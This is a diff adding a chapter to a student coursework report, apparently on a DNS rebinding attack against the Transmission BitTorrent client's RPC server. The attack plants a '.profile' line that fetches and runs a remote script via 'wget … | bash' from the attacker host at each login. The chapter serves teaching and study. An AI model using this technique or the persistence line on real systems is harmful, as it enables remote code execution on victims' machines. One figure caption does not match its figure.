@@ -1,2 +1,82 @@
-\chapter{Implementing DNS Rebinding}
+\chapter{Implementation of Attack Using DNS Rebinding}
 \label{implementation}
+
+In this coursework we attack the Transmission (\texttt{< v2.9.3}) bittorrent
+client. We use DNS Rebinding to exploit a (now patched~\cite{transmission_pr})
+vulnerability discovered by Tavis Ormandy.
+
+The vulnerability allows us to send arbitrary commands to Transmission's remote
+procedure call (RPC) server which it uses to enable the web interface to manage
+torrent downloads and application settings. DNS Rebinding is essential to this
+attack due to the Same-Origin Policy, the local RPC server would in general
+drop requests responding with \texttt{403: Access Forbidden} as the IP is not
+allowed to. Through DNS Rebinding request can be made to look as though they
+originate from any IP address, in our case we choose \texttt{127.0.0.1} (the
+IPv4 loopback interface).
+
+Our implementation\footnote{Our project is available at:
+\url{https://github.com/CGA1123/F20AN}} makes use of
+\texttt{rbndr}~\cite{rbndr} a DNS rebinding service created explicitly for
+testing of DNS rebinding vulnerabilities by Tavis Ormandy. It implements
+time-varying DNS rebinding, that is the DNS server will alternate responses
+between two given IP addresses. Figure~\ref{rbndr_host} shows an example of
+this.
+
+\begin{figure}[H]
+\begin{center}
+\begin{tabular}{c}
+\begin{lstlisting}
+$ host 7f000001.7f000002.rbndr.us
+7f000001.7f000002.rbndr.us has address 127.0.0.1
+$ host 7f000001.7f000002.rbndr.us
+7f000001.7f000002.rbndr.us has address 127.0.0.2
+\end{lstlisting}
+\end{tabular}
+\end{center}
+\caption{Example of let-style polymorphism}
+\label{rbndr_host}
+\end{figure}
+
+Our implementation builds on the proof of concept attack presented by Tavis
+Ormandy in his security report to the Transmission security
+team~\cite{tavis_report}.
+
+We server specially crafted JavaScript from an attack server that repeatedly
+loads an iFrame with the following url
+\url{7f000001.0a00021e.rbndr.us:9091/transmission/iframe.html} when the DNS
+rebinding service binds to our attack server (\texttt{0a00021e} is
+\texttt{10.0.2.30} converted to base 16) it loads another script that will
+first of all stop the initial web page from reloading the iframe, and then make
+\texttt{XMLHttpRequests} to \url{/transmission/rpc} until the DNS server binds
+\url{7f000001.0a00021e.rbndr.us:9091} to \texttt{127.0.0.1} at which point the
+we can send arbitrary requests to the Transmission RPC server running on the
+victims machine.
+
+The RPC server is very well documented (See~\cite{rpc_spec}), in our attacks we
+send a \texttt{torrent-add} command to download a \texttt{.profile} file to the
+victims home directory. The home directory is found by analysing the user's
+current download directory which is found through the \texttt{session-get} RPC
+command.
+
+After a successful attack the victim will have a \texttt{.profile} downloaded
+to their home directory which contains the following code: \texttt{wget -q -O -
+http://10.0.2.30/attack.sh | bash} which allows an attacker to host a attack
+script which will be executed whenever the user starts a login shell, or logs
+in graphically. For demonstration purposes our attack script does not do
+anything malicious and is shown in Figure~\ref{attack_script}, however any
+arbitrary code could be executed.
+
+\begin{figure}[H]
+\begin{center}
+\begin{tabular}{c}
+\begin{lstlisting}
+while true; do
+	notify-send -i face-wink "Attack Successful!"
+	sleep 5
+done &
+\end{lstlisting}
+\end{tabular}
+\end{center}
+\caption{Our example attack script}
+\label{attack_script}
+\end{figure}
